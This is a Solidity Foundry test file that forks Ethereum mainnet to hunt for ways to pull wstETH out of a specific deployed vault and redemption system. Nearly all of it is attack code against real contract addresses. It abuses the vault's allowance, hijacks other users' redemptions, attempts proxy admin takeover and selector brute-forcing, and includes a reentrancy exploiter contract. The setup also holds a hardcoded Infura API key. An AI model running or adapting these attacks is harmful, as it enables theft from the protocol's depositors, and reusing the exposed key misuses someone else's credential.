// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

interface IwstETH {
    function wrap(uint256 _stETHAmount) external returns (uint256);
    function unwrap(uint256 _wstETHAmount) external returns (uint256);
    function getStETHByWstETH(uint256 _wstETHAmount) external view returns (uint256);
    function getWstETHByStETH(uint256 _stETHAmount) external view returns (uint256);
    function stEthPerToken() external view returns (uint256);
}

/**
 * CREATIVE IMMEDIATE EXTRACTION
 *
 * Exploring unconventional paths:
 * 1. Flash loan + reentrancy combinations
 * 2. wstETH callback exploitation
 * 3. Exchange rate manipulation during redemption
 * 4. Frontrunning/sandwiching redemption finalization
 * 5. TASSET proxy manipulation
 * 6. Arbitrary call gadgets
 */
contract CreativeImmediateExtraction is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;

    // Aave V3 Pool for flash loans
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    // Balancer Vault
    address constant BALANCER = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_ExploitVaultDirectTransfer() public {
        console.log("=== EXPLOIT VAULT DIRECT TRANSFER ===\n");

        // RC has unlimited allowance from VAULT
        // Can we trick RC into transferring to us?

        uint256 allowance = IERC20(wstETH).allowance(VAULT, RC);
        console.log("RC allowance from VAULT:", allowance > 1e50 ? "UNLIMITED" : "LIMITED");

        // What if we call RC's internal transfer function directly?
        vm.startPrank(attacker);

        // Try calling RC with crafted calldata that might trigger transferFrom
        bytes memory transferCall = abi.encodeWithSelector(
            bytes4(0x23b872dd), // transferFrom selector
            VAULT,
            attacker,
            1000e18
        );

        (bool s1,) = RC.call(transferCall);
        console.log("Direct transferFrom on RC:", s1);

        // Try calling with different function signatures that might exist
        (bool s2,) = RC.call(abi.encodeWithSignature("processRedemption(address,uint256)", attacker, 1000e18));
        console.log("processRedemption:", s2);

        (bool s3,) = RC.call(abi.encodeWithSignature("executeRedemption(address,uint256,uint256)", attacker, 0, 1000e18));
        console.log("executeRedemption:", s3);

        (bool s4,) = RC.call(abi.encodeWithSignature("completeRedemption(uint256)", 0));
        console.log("completeRedemption:", s4);

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_HijackExistingRedemption() public {
        console.log("=== HIJACK EXISTING REDEMPTION ===\n");

        // Check if there are any existing redemptions we can hijack
        // By calling finalizeRedeem for other users

        // First find users who have pending redemptions
        // Check recent transactions or storage

        // Try common addresses
        address[] memory potentialUsers = new address[](10);
        potentialUsers[0] = 0x0000000000000000000000000000000000000001;
        potentialUsers[1] = 0x0000000000000000000000000000000000000002;
        potentialUsers[2] = TIMELOCK;
        potentialUsers[3] = VAULT;
        potentialUsers[4] = RC;
        potentialUsers[5] = 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045; // vitalik.eth
        potentialUsers[6] = 0x28C6c06298d514Db089934071355E5743bf21d60; // Binance
        potentialUsers[7] = 0xDef1C0ded9bec7F1a1670819833240f027b25EfF; // 0x
        potentialUsers[8] = 0x1111111254fb6c44bAC0beD2854e76F90643097d; // 1inch
        potentialUsers[9] = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45; // Uniswap

        for (uint i = 0; i < potentialUsers.length; i++) {
            (bool s, bytes memory d) = R0.staticcall(
                abi.encodeWithSignature("getRedeemLength(address)", potentialUsers[i])
            );
            if (s && d.length >= 32) {
                uint256 len = abi.decode(d, (uint256));
                if (len > 0) {
                    console.log("Found user with redemptions:", potentialUsers[i]);
                    console.log("Redemption count:", len);

                    // Try to finalize their redemption
                    vm.startPrank(attacker);
                    (bool fs,) = R0.call(abi.encodeWithSignature("finalizeRedeemFor(address,uint256)", potentialUsers[i], 0));
                    console.log("finalizeRedeemFor:", fs);
                    vm.stopPrank();
                }
            }
        }
    }

    function test_ReentrancyDuringRedeem() public {
        console.log("=== REENTRANCY DURING REDEEM ===\n");

        // Deploy reentrancy contract
        ReentrancyExploiter re = new ReentrancyExploiter(R0, RC, VAULT, wstETH, TASSET);

        deal(TASSET, address(re), 10000e18);

        console.log("Exploiter deployed:", address(re));
        console.log("Starting reentrancy attack...");

        re.attack();

        console.log("Exploiter wstETH:", IERC20(wstETH).balanceOf(address(re)) / 1e18);
        console.log("Exploiter TASSET remaining:", IERC20(TASSET).balanceOf(address(re)) / 1e18);
    }

    function test_ManipulateRedemptionStorage() public {
        console.log("=== MANIPULATE REDEMPTION STORAGE ===\n");

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Create redemption
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        vm.stopPrank();

        // Calculate storage slot
        bytes32 arrayLengthSlot = keccak256(abi.encode(attacker, uint256(5)));
        bytes32 arrayBaseSlot = keccak256(abi.encode(arrayLengthSlot));

        bytes32 data0 = vm.load(R0, arrayBaseSlot);
        bytes32 data1 = vm.load(R0, bytes32(uint256(arrayBaseSlot) + 1));

        console.log("Original redemption data:");
        console.log("Slot 0:");
        console.logBytes32(data0);
        console.log("Slot 1:");
        console.logBytes32(data1);

        // The redemption data appears to be:
        // Slot 0: amount (low) + timestamp (high)
        // Slot 1: exchange rate or other data

        // What if we can find a collision to overwrite this?
        // Or use a different user address that maps to same slot?

        // Try to create another redemption that might collide
        address craftedAddr = address(uint160(uint256(keccak256(abi.encode(attacker)))));
        console.log("\nCrafted address:", craftedAddr);

        bytes32 craftedArraySlot = keccak256(abi.encode(craftedAddr, uint256(5)));
        bytes32 craftedBaseSlot = keccak256(abi.encode(craftedArraySlot));

        console.log("Crafted base slot:");
        console.logBytes32(craftedBaseSlot);
        console.log("Original base slot:");
        console.logBytes32(arrayBaseSlot);
    }

    function test_ExploitR0Fallback() public {
        console.log("=== EXPLOIT R0 FALLBACK ===\n");

        // Check if R0 has a fallback that does something interesting
        vm.startPrank(attacker);

        // Send ETH to R0
        (bool s1,) = R0.call{value: 1 ether}("");
        console.log("Send ETH to R0:", s1);

        // Call with empty data
        (bool s2,) = R0.call("");
        console.log("Empty call to R0:", s2);

        // Call with garbage data
        (bool s3,) = R0.call(hex"deadbeef");
        console.log("Garbage call to R0:", s3);

        // Call with almost-valid selector
        (bool s4,) = R0.call(abi.encodeWithSignature("redeem(uint256)", 1000e18)); // wrong param type
        console.log("Wrong param type redeem:", s4);

        vm.stopPrank();
    }

    function test_ExploitTASSETProxy() public {
        console.log("=== EXPLOIT TASSET PROXY ===\n");

        console.log("TASSET:", TASSET);
        console.log("TASSET code size:", TASSET.code.length);

        // TASSET is a tiny proxy (176 bytes)
        // Check its implementation
        bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        bytes32 impl = vm.load(TASSET, implSlot);
        console.log("EIP-1967 impl:");
        console.logBytes32(impl);

        // Check slot 2 (found earlier to contain wstETH address)
        bytes32 slot2 = vm.load(TASSET, bytes32(uint256(2)));
        console.log("TASSET slot 2:");
        console.logBytes32(slot2);

        address slot2Addr = address(uint160(uint256(slot2)));
        console.log("Slot 2 as address:", slot2Addr);

        // If TASSET is a proxy to wstETH...
        // Can we call underlying wstETH functions through TASSET?

        vm.startPrank(attacker);

        (bool s1,) = TASSET.call(abi.encodeWithSignature("unwrap(uint256)", 1000e18));
        console.log("TASSET.unwrap:", s1);

        (bool s2,) = TASSET.call(abi.encodeWithSignature("wrap(uint256)", 1000e18));
        console.log("TASSET.wrap:", s2);

        // Try to call admin functions
        (bool s3,) = TASSET.call(abi.encodeWithSignature("upgradeTo(address)", attacker));
        console.log("TASSET.upgradeTo:", s3);

        (bool s4,) = TASSET.call(abi.encodeWithSignature("changeAdmin(address)", attacker));
        console.log("TASSET.changeAdmin:", s4);

        vm.stopPrank();
    }

    function test_FlashLoanRedemptionRace() public {
        console.log("=== FLASH LOAN REDEMPTION RACE ===\n");

        // What if we flash loan TASSET, redeem, and somehow finalize in same tx?

        // First check if TASSET can be flash loaned
        console.log("Checking flash loan availability...");

        // Check Balancer
        (bool s1, bytes memory d1) = BALANCER.staticcall(
            abi.encodeWithSignature("getPoolTokens(bytes32)", bytes32(0))
        );
        console.log("Balancer available:", s1);

        // Check if there's a flash mint on TASSET
        (bool s2,) = TASSET.staticcall(abi.encodeWithSignature("maxFlashLoan(address)", TASSET));
        console.log("TASSET flashLoan:", s2);

        // Even without flash loan, check the redemption flow
        // Maybe there's a way to manipulate it

        deal(TASSET, attacker, 50000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Create multiple redemptions rapidly
        for (uint i = 0; i < 5; i++) {
            R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        }

        // Check state
        (bool s3, bytes memory d3) = R0.staticcall(
            abi.encodeWithSignature("getRedeemLength(address)", attacker)
        );
        console.log("Redemption count:", abi.decode(d3, (uint256)));

        // Try to finalize any
        for (uint i = 0; i < 5; i++) {
            (bool fs,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", i));
            if (fs) {
                console.log("Finalized index:", i);
            }
        }

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_ExploitCancelRedeem() public {
        console.log("=== EXPLOIT CANCEL REDEEM ===\n");

        deal(TASSET, attacker, 10000e18);

        uint256 tassetBefore = IERC20(TASSET).balanceOf(attacker);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Create redemption
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));

        uint256 tassetAfterRedeem = IERC20(TASSET).balanceOf(attacker);
        console.log("TASSET spent on redeem:", (tassetBefore - tassetAfterRedeem) / 1e18);

        // Cancel it
        (bool cancelOk,) = R0.call(abi.encodeWithSignature("cancelRedeem(uint256)", 0));
        console.log("Cancel success:", cancelOk);

        uint256 tassetAfterCancel = IERC20(TASSET).balanceOf(attacker);
        console.log("TASSET after cancel:", tassetAfterCancel / 1e18);
        console.log("TASSET returned:", (tassetAfterCancel - tassetAfterRedeem) / 1e18);

        // Is there any profit from cancel?
        if (tassetAfterCancel > tassetBefore) {
            console.log("*** PROFIT FROM CANCEL! ***");
        }

        // Try cancel-redeem loop
        console.log("\nTrying cancel-redeem loop...");
        for (uint i = 0; i < 3; i++) {
            R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
            R0.call(abi.encodeWithSignature("cancelRedeem(uint256)", 0));
        }

        uint256 tassetFinal = IERC20(TASSET).balanceOf(attacker);
        console.log("Final TASSET:", tassetFinal / 1e18);

        vm.stopPrank();
    }

    function test_ExploitVaultSlot5Contract() public {
        console.log("=== EXPLOIT VAULT SLOT 5 CONTRACT ===\n");

        // VAULT slot 5 = 0x97c03F52244E60BB18511Cbf03f890D5886f1F47
        // Has 2 DELEGATECALLs
        address vaultSlot5 = 0x97c03F52244E60BB18511Cbf03f890D5886f1F47;

        console.log("VaultSlot5:", vaultSlot5);

        // Scan all its functions
        vm.startPrank(attacker);

        bytes4[] memory sigs = new bytes4[](30);
        sigs[0] = bytes4(keccak256("withdraw(uint256)"));
        sigs[1] = bytes4(keccak256("deposit(uint256)"));
        sigs[2] = bytes4(keccak256("redeem(uint256)"));
        sigs[3] = bytes4(keccak256("mint(uint256)"));
        sigs[4] = bytes4(keccak256("harvest()"));
        sigs[5] = bytes4(keccak256("compound()"));
        sigs[6] = bytes4(keccak256("rebalance()"));
        sigs[7] = bytes4(keccak256("claim()"));
        sigs[8] = bytes4(keccak256("claimRewards()"));
        sigs[9] = bytes4(keccak256("exit()"));
        sigs[10] = bytes4(keccak256("emergencyWithdraw()"));
        sigs[11] = bytes4(keccak256("panic()"));
        sigs[12] = bytes4(keccak256("pause()"));
        sigs[13] = bytes4(keccak256("unpause()"));
        sigs[14] = bytes4(keccak256("sweep(address)"));
        sigs[15] = bytes4(keccak256("rescue(address)"));
        sigs[16] = bytes4(keccak256("execute(bytes)"));
        sigs[17] = bytes4(keccak256("multicall(bytes[])"));
        sigs[18] = bytes4(keccak256("batch(bytes[])"));
        sigs[19] = bytes4(keccak256("call(address,bytes)"));
        sigs[20] = bytes4(keccak256("delegatecall(address,bytes)"));
        sigs[21] = bytes4(keccak256("processQueue()"));
        sigs[22] = bytes4(keccak256("processRedemptions()"));
        sigs[23] = bytes4(keccak256("fulfillRedemption(uint256)"));
        sigs[24] = bytes4(keccak256("executeStrategy()"));
        sigs[25] = bytes4(keccak256("redeemUnderlying(uint256)"));
        sigs[26] = bytes4(keccak256("withdrawUnderlying(uint256)"));
        sigs[27] = bytes4(keccak256("claimable(address)"));
        sigs[28] = bytes4(keccak256("earned(address)"));
        sigs[29] = bytes4(keccak256("getPendingRewards()"));

        console.log("Testing functions...");
        for (uint i = 0; i < sigs.length; i++) {
            (bool success,) = vaultSlot5.call{gas: 200000}(abi.encodeWithSelector(sigs[i], 1000e18));
            if (success) {
                console.log("Success: selector %d", i);
                console.logBytes4(sigs[i]);
            }
        }

        vm.stopPrank();

        console.log("\nAttacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_DirectVaultWithdraw() public {
        console.log("=== DIRECT VAULT WITHDRAW ===\n");

        // Check all vault functions
        console.log("VAULT:", VAULT);
        console.log("VAULT wstETH:", IERC20(wstETH).balanceOf(VAULT) / 1e18);

        vm.startPrank(attacker);

        // Standard ERC4626 functions
        (bool s1,) = VAULT.call(abi.encodeWithSignature("withdraw(uint256,address,address)", 1000e18, attacker, attacker));
        console.log("withdraw(amount,to,owner):", s1);

        (bool s2,) = VAULT.call(abi.encodeWithSignature("redeem(uint256,address,address)", 1000e18, attacker, attacker));
        console.log("redeem(shares,to,owner):", s2);

        // Try with max values
        (bool s3,) = VAULT.call(abi.encodeWithSignature("maxWithdraw(address)", attacker));
        if (s3) console.log("maxWithdraw exists");

        (bool s4,) = VAULT.call(abi.encodeWithSignature("maxRedeem(address)", attacker));
        if (s4) console.log("maxRedeem exists");

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }
}

contract ReentrancyExploiter {
    address r0;
    address rc;
    address vault;
    address wsteth;
    address tasset;

    uint256 public attackPhase;
    uint256 public reentryCount;
    bool public attacking;

    constructor(address _r0, address _rc, address _vault, address _wsteth, address _tasset) {
        r0 = _r0;
        rc = _rc;
        vault = _vault;
        wsteth = _wsteth;
        tasset = _tasset;
    }

    function attack() external {
        attacking = true;
        IERC20(tasset).approve(r0, type(uint256).max);

        // Phase 1: Create redemption
        attackPhase = 1;
        r0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));

        attacking = false;
    }

    // ERC777 callback
    function tokensReceived(
        address, address, address, uint256, bytes calldata, bytes calldata
    ) external {
        if (attacking && reentryCount < 5) {
            reentryCount++;
            _tryExploit();
        }
    }

    // ERC721 callback
    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (attacking && reentryCount < 5) {
            reentryCount++;
            _tryExploit();
        }
        return this.onERC721Received.selector;
    }

    // Generic fallback
    fallback() external payable {
        if (attacking && reentryCount < 5) {
            reentryCount++;
            _tryExploit();
        }
    }

    receive() external payable {}

    function _tryExploit() internal {
        // Try various exploits during callback

        // Try to finalize our redemption
        r0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));

        // Try to cancel and create new
        r0.call(abi.encodeWithSignature("cancelRedeem(uint256)", 0));
        r0.call(abi.encodeWithSignature("redeem(uint96)", uint96(500e18)));
    }
}
